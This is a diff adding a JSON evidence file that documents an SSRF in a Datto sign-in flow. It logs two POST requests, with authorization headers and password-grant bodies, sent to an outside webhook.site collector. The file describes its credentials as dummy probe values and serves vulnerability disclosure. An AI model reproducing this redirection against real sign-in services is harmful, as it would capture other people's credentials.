@@ -1,0 +1,31 @@
+{
+  "description": "Sanitized researcher-owned collector evidence for Datto sign-in SSRF; all credentials are dummy values.",
+  "events": [
+    {
+      "captured_utc": "2026-09-23 18:23:24",
+      "source_ip": "74.234.78.221",
+      "method": "POST",
+      "url": "https://ce6a2477-1ff8-4072-b75c-252c8c3fc042.webhook.site/",
+      "content_type": [
+        "application/x-www-form-urlencoded"
+      ],
+      "authorization": [
+        "Basic cHVibGljLWNsaWVudDpwdWJsaWM="
+      ],
+      "body": "username=invalid-codex-probe&password=invalid-codex-probe&grant_type=password"
+    },
+    {
+      "captured_utc": "2026-09-23 18:24:35",
+      "source_ip": "74.234.78.221",
+      "method": "POST",
+      "url": "https://ce6a2477-1ff8-4072-b75c-252c8c3fc042.webhook.site/probe?marker=path-test",
+      "content_type": [
+        "application/x-www-form-urlencoded"
+      ],
+      "authorization": [
+        "Basic cHVibGljLWNsaWVudDpwdWJsaWM="
+      ],
+      "body": "username=invalid-codex-probe&password=invalid-codex-probe&grant_type=password"
+    }
+  ]
+}
